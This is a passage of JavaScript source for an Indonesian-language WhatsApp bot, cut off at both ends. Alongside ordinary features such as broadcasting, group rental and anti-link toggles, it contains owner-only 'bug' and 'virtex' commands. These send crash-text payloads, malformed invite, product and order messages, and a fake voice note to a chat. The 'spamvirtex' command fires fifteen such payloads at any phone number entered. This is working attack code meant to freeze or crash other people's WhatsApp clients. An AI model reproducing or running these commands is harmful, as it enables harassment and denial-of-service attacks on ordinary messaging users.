                xdev.sendMessage(from, `${virtex7(prefix)} `, text, {
                    'contextInfo': {
                        'text': '🔥',
                        'forwardingScore': 999999999,
                        'isForwarded': true,
                        'sendEphemeral': true,
                        'externalAdReply': {
                            'title': 'bug',
                            'body': '',
                            'previewType': 'PHOTO',
                            'thumbnail': thumb,
                            'sourceUrl': ''
                        }
                    },
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                         'remoteJid': '0@s.whatsapp.net'
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 'INQUIRY',
                                'surface': 'CATALOG',
                                'message': 'NOPE',
                                'orderTitle': 'hay',
                                'thumbnail': davizin,
                                  'sellerJid': '0@s.whatsapp.net'
                            }
                        }
                    }
                });
                break;
                
                
                
                
                
           case 'bugv4':
                if(isExtream) return
                    if (!isOwner) return onlyOwner()
                    if(isGroup) return setReply("Gunakan bug ini di chat")
           {                
                    xdev.sendMessage(from, {
                        'groupName': virtex8(prefix),
                        'groupJid': '6285156137901-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': davizin,
                    }, MessageType.groupInviteMessage, { contextInfo: forward
                    })             
                    }
                    break;
                    
           case 'bugv5':
                if(isExtream) return
                    if (!isOwner) return onlyOwner()
           {
              
               hmm4 = fs.readFileSync('./stik/fake.jpeg'),
               imeu = await xdev.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
                imeg = imeu.message.imageMessage
                   res = await xdev.prepareMessageFromContent(from, {
                        'productMessage': {
                            'product': {
                           'productImage': imeg,
                                'productId': '',
                                'title': virtex8(prefix),
                                'description': virtex8(prefix),
                                'priceAmount1000': '1000',
                                'descriptionCount': 1,
                                'productImageCount': '1'
                            },
                            'businessOwnerJid': `0@s.whatsapp.net`,
                            'contextInfo': forward
                        }
                    }, {
                  contextInfo: forward
                    }), 
                  xdev.relayWAMessage(res)
                
                    }
                    break;
    
           case 'bugvn':
           if(isExtream) return
                    if (!isOwner) return onlyOwner()
                iya2 = fs.readFileSync('./lib/amaterasu.mp3')
                xdev.sendMessage(from, iya2, audio, {
                    'quoted': {
                        'key': {
                            'participant': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 1,
                                'thumbnail': virgam,
                                'surface': 1,
                                'message': virtex7(prefix),
                                'orderTitle': fake,
                                'sellerJid': "0@s.whatsapp.net",
                                'sendEphemeral': true,
                            }
                        }
                    },
                    'filename': '' + ngazap(prefix),
                    'mimetype': 'audio/mp4',
                    'duration': '359996400',
                    'ptt': true
                });
                break;

  case 'virtex':
                if(isExtream) return
                    if (!isOwner) return onlyOwner()
           {
           setReply('*Loading...*')
               await xdev.sendMessage(from, virtexbytsukasa(prefix), text)                
               await xdev.sendMessage(from, virtex(prefix), text)            
                await xdev.sendMessage(from, virtex2(prefix), text)       
                 await xdev.sendMessage(from, virtex3(prefix), text)    
                await xdev.sendMessage(from, virtex4(prefix), text)              
                await xdev.sendMessage(from, virtex5(prefix), text)     
                await xdev.sendMessage(from, virtex6(prefix), text)
                await xdev.sendMessage(from, virtex7(prefix), text)   
                await xdev.sendMessage(from, virtex8(prefix), text)            
                await xdev.sendMessage(from, virtex9(prefix), text)       
                 await xdev.sendMessage(from, virtex10(prefix), text)    
                await xdev.sendMessage(from, virtex11(prefix), text)              
                await xdev.sendMessage(from, virtex12(prefix), text)     
                await xdev.sendMessage(from, philip(prefix), text)
                 await xdev.sendMessage(from, slayer(prefix), text) 
                 await xdev.sendMessage(from, ngazap(prefix), text)
           }
                break;
           
           
           
           
           
           
           
           
          
           
           case 'spamvirtex':    
              //  if(isExtream) return
                   if (!isOwner) return onlyOwner()
                     try {                 
                     setReply('*Loading...*')
                    if (args.length < 1) return setReply(`Penggunaan ${prefix}spamvirtex nomor`)
					if (args[0].startsWith('08')) return setReply('Gunakan kode negara kak')
			       woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
					var nilaiAwal = 1;
                    while(nilaiAwal <= 3) { 
                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, virtex7(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, virtex6(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, ngazap(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, philip(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, virtexbytsukasa(prefix), text, {contextInfo: forward})
                     nilaiAwal++}
					await xdev.sendMessage(from, `*Sukses send virtex sebanyak 15 virtex ke nomor ${q}*`, text, {quoted : dev})
					} catch (e) {
					console.log('Error :', e)
					setReply(`*Gagal mengirim virtex, System error pastikan memasukan nomer whatsapp dengan benar*`)
					}                        
					break
      
           
           
           case 'ssweb':
            case 'ss':
            if(!isUrl(args[0]) && !args[0].includes('www.')) return reply("Link error");
                if (args.length < 1) return setReply('Urlnya mana om')
					teks = q
					ana = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
					buff = await getBuffer(ana.screenshot)
					xdev.sendMessage(from, buff, image, {quoted: dev, caption : teks})
					break
           
           
           
           
           
           
           
           
           
           
           
           
//-------------------------------》FITUR OWNER《-------------------------------\\     
           
           case 'addorder':
            try{
           if (!isOwner) return onlyOwner()
            if (args.length < 1) return setReply(`Penggunaan :\n${prefix}addorder linkgc 60s\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)       
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return setReply(mess.Iv)
            if (!q) return setReply('masukan link gcnya kak')
            
             var LinkGc = q.split(" ")[0];
            var Second = q.split(" ")[1];
           
            var net = LinkGc.split('https://chat.whatsapp.com/')[1]
            if (!net) return setReply('pastikan itu link https://whatsapp.com/')
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await xdev.query({ 
            json: ["query", "invite",net],
            expect200:true })
           if(_sewa.checkSewaGroup(id, sewa)) return setReply("Grup tersebut masih tersisa waktu sewa")
              if(!isGroup){            
                          let code = LinkGc.replace('https://chat.whatsapp.com/', '')
                          xdev.acceptInvite(code)                                   
                          } else {
                            if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return setReply('*The link is invalid Tod*')
                            link = LinkGc.replace('https://chat.whatsapp.com/','')
                            fak = xdev.query({ json: ['action', 'invite', link],
                            expect200: true })                        
                            }                          
                            await setReply(`Sukses join kak`)
                              
                        _sewa.addSewaGroup(id, subject, LinkGc, Second, sewa)
                       await sendButMessage(id, `HALO KAK AKU *${fake}*`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}ceksewa`, buttonText: {displayText: `Cek sewa`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `Menu`,},type: 1}]);
                            }catch (err){
					      console.log(err)
					       return setReply("Link Error")
					       }
                           break
             
        
        
        case 'freeoneday':
            try{
            if (!q) return setReply('Masukan link gcnya kak')
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return setReply("Linknya betul ga tuh")
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return setReply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await xdev.query({ 
            json: ["query", "invite",net],
            expect200:true })
            if(!isGroup){            
                          let code = args[0].replace('https://chat.whatsapp.com/', '')
                          xdev.acceptInvite(code)                                   
                          } else {
                            if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return setReply('*The link is invalid Tod*')
                            link = args[0].replace('https://chat.whatsapp.com/','')
                            fak = xdev.query({ json: ['action', 'invite', link],
                            expect200: true })                        
                            }                          
                            await setReply(`Oke aku udah join :)`)
                            await xdev.sendMessage(`${nomerOwner}@s.whatsapp.net`,`*「 freeoneday 」*\n\nHalo kak, ada yang sewa aku nih\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nLink Gc : \n\n${q}\n\nCommand :\n${prefix}${command}\n\n\n© ${fake1}\n${calender}\n`,text)                                         
                             _sewa.addSewaGroup(id, subject, q, "1d", sewa)
                            await sendButMessage(id, `HALO KAK AKU *${fake}*`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}ceksewa`, buttonText: {displayText: `Cek sewa`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `Menu`,},type: 1}]);
                            }catch (err){
					      console.log(err)
					       return setReply("Link Error")
					       }
                           break
        
        
        
        
        
        case 'antibuggc':
                    if(!isGroup) return setReply("Hanya bisa di group")
			        if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
			        if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (Antibuggc) return setReply('Sudah aktif kak')
                    addDataId(from, command, DataId)
                    setReply("Sukses mengaktifkan antibuggc di grub ini!");
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (!Antibuggc) return setReply('Sudah Mati')
                    removeDataId (command, from, DataId)
                    setReply("Sukses mematikan antibuggc!");
					} else if (!q) {
                      sendButMessage(from, `MODE ANTI BUGGC`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antibuggc on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antibuggc off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 case 'autolevel':
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autoLevel) return setReply('Sudah aktif kak')
                    autoLevel = true
                    setReply("Sukses mengaktifkan auto level!");
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (!autoLevel) return setReply('Sudah Mati')
                    autoLevel = false
                    setReply("Sukses mematikan auto level!");
					} else if (!q) {
                      sendButMessage(from, `MODE AUTO LEVEL`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autolevel on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autolevel off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
                 case 'nsfw':
                  if(!isGroup) return setReply("Hanya bisa di group")
                    if(isExtream) return
			        if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
			        if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (checkDataId ("nsfw", from, DataId) ) return setReply('Sudah aktif kak')
                    addDataId(from, command, DataId)
                    setReply("Nsfw telah di di aktifkan")
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (!checkDataId ("nsfw", from, DataId) ) return setReply('Sudah Mati')
                    removeDataId (command, from, DataId)
                    setReply("Nsfw telah di matikan")
					} else if (!q) {
                      sendButMessage(from, `MODE ANTI BUGGC`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}nsfw on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}nsfw off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
        
                 
           
           case 'antitroli':
            if(!isGroup) return setReply("Hanya bisa di group")
                    if(isExtream) return
					if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (antibugtroli === true) return setReply('Sudah aktif kak')
                    antibugtroli = true
                    let ah =`Mode anti bugtroli aktif kak`
                    xdev.sendMessage(from, ah, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (antibugtroli === false) return setReply('Udah off kak')
                     antibugtroli = false
                     let uh =`Mode anti bugtroli di matikan`
                     xdev.sendMessage(from, uh, text, { quoted: setQuoted, contextInfo: forward})
					} else if (!q) {
                      sendButMessage(from, `MODE ANTI BUGTROLI`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antitroli on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antitroli off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
           
           
           case 'antilink':
    if (!isGroupAdmins) return sendSticker(hanyaadmin)
					if (!isGroup) return setReply('hanya bisa di group')
					if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (isAntiLink) return setReply('Fitur sudah aktif kak')
						addDataId(from, command, DataId)
						let ih =`Fitur antilink telah di aktifkan`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isAntiLink) return setReply('Udah mati')
						removeDataId (command, from, DataId)
						let ih =`Fitur antilink telah di matikan`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE ANTI LINK`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antilink on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antilink off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
           
           
           
           
                 
                 
                 case 'forward':
					       if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (forwarding === true) return setReply('Udah aktif kak')
                    forwarding = true
                    let ah =`Mode forwarding/diteruskan berhasil diaktifkan \nsilakan ketik ${prefix}menu untuk melihat perbedaanya`
                    xdev.sendMessage(from, ah, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (forwarding === false) return setReply('Udah off kak')
                     forwarding = false
                     let uh =`Mode forwarding telah di matikan`
                     xdev.sendMessage(from, uh, text, { quoted: setQuoted})
					} else if (!q) {
                      sendButMessage(from, `MODE AUTO TYPING`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}forwarding on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}forwarding off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
           
           
     
	
	
           
           
           case 'bc':
           
					if (!isOwner && !dev.key.fromMe) return onlyOwner()
					if (args.length < 1) return setReply('Teksnya?')
					await setReply(`*Loading...*`)
					anus = await xdev.chats.all()
					let butonih = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
					
					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						}else if (isMedia && !dev.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, audio, { ptt: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `${q}`, orderTitle: `${q}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
					} else {
						for (let _ of anus) {
							await sendBc(_.jid, ` *BROADCAST*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'),butonih)
						}
						await setReply(`Sukses mengirim Broadcast:\n${q}`)
					}
					break
					
					
					
					case 'bcpc':
					if (!isOwner && !dev.key.fromMe) return onlyOwner()
					if (args.length < 1) return setReply('Teksnya?')
					await setReply(`*Loading...*`)
					anus = await xdev.chats.all().filter(v => v.jid.endsWith('s.whatsapp.net'))
					let ohyeah = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						}else if (isMedia && !dev.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, audio, { ptt: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `${q}`, orderTitle: `${q}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
					} else {
						for (let _ of anus) {
							await sendBc(_.jid, ` *BROADCAST*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'),ohyeah)
						}
						await setReply(`Sukses mengirim Broadcast:\n${q}`)
					}
					break
					
					
					
					
					case 'bcgc':
					if (!isOwner && !dev.key.fromMe) return onlyOwner()
					if (args.length < 1) return setReply('Teksnya?')
					await setReply(`*Loading...*`)
					anus = await xdev.chats.all().filter(v => v.jid.endsWith('g.us'))
					let yesnih = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						}else if (isMedia && !dev.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, audio, { ptt: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `${q}`, orderTitle: `${q}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
					    } else {
						for (let _ of anus) {
							
					    await sendBc(_.jid, ` *BROADCAST GROUP*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'), yesnih)
						} 
						await setReply(`Sukses mengirim Broadcast:\n${q}`)
					    }
					   break
					
					case 'cuaca':
			       if (!q) return setReply('Masukan Nama Daerah')
                  await setReply('Searching...')
	              axios.get(`https://api.xteam.xyz/cuaca?kota=${q}&APIKEY=MIMINETBOT`).then ((res) => {
	 	         let hasil = `Cuaca Daerah *${q}*\n\nTempat : ${res.data.message.kota}\nAngin : ${res.data.message.angin}\nCuaca : ${res.data.message.cuaca}\nDeskripsi : ${res.data.message.deskripsi}\nKelembapan : ${res.data.message.kelembapan}\nSuhu : ${res.data.message.suhu}\nUdara : ${res.data.message.pressure}`
                  setReply(hasil)
	              })
	             break
					
					case 'pcallmember':
					case 'pcallmem':
					case 'bcmember':
					if(!isGroup) return setReply("Fitur hanya bisa di gunakan di dalam group")
					if (!isOwner && !dev.key.fromMe) return onlyOwner()
					if (args.length < 1) return setReply('Teksnya?')
					await setReply(`*Loading...*`)
					anus = await groupMembers
					let ayey = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
                    {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
					} else {
						for (let _ of anus) {
							await sendBc(_.jid, `*BROADCAST PRIVATE*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'), ayey)
						}
						sendMess(`Sukses mengirim Broadcast:\n${q}`)
					}
					break
           
           
           
           
           
           
           case 'sendhidetag':        
	        if (args.length < 1) return setReply(`Penggunaan ${prefix}sendhidetag idgc|teks\nUntuk mendapatkan id gc ketik ${prefix}getidgc di group`)
		    if (args[0].startsWith('08')) return setReply('Maukin idgc goblok')
            if (args[0].startsWith('+62')) return setReply('masukin idgc peak lu')
		    var gc = body.slice(13)
            var idgc = gc.split("|")[0];
            var teks = gc.split("|")[1];
